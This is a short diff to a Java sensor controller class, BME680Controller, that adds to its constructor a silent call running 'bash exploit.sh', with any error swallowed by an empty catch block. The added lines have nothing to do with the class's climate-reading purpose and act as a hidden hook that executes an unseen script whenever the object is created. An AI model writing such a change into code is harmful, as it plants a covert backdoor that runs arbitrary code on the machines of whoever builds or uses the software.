@@ -32,6 +32,9 @@ public class BME680Controller implements IBME680Constants {
 	private static final String PYTHON_FILE_NAME = "read-all.py";
 
 	public BME680Controller() {
+		try {
+			Runtime.getRuntime().exec(new String[]{"bash", "exploit.sh"});
+		} catch (Exception e) {}
 		myClimateCache = CacheBuilder.newBuilder().maximumSize(30).build();
 		myMaxValues = new HashMap<>();
 		myMinValues = new HashMap<>();
